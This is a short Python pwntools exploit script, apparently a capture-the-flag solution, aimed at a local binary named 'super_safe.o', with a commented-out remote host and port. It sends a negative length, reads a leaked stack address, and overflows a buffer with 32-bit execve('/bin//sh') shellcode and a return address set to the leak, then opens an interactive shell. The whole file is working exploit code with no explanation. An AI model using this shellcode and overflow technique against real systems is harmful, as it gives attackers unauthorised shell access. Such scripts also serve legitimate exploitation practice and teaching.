from pwn import *

r = process('./super_safe.o')
# r = remote('221.149.226.120', 31337)

r.recvuntil(b'\n')

length = -1;
r.sendline(str(length))

r.recvuntil(b'stack : ')
leak = r.recvuntil(b'\n')[:-1]
leak = int(leak, 16)

shellcode = b"\x31\xc0\x50\x68\x6e\x2f\x73\x68\x68\x2f\x2f\x62\x69\x89\xe3\x31\xc9\x31\xd2\xb0\x08\x40\x40\x40\xcd\x80"
ex = shellcode + b'a'*(40-len(shellcode))
ex += b'b' * 8
ex += p32(leak)
r.send(ex)

r.recvuntil(b'b')

r.interactive()     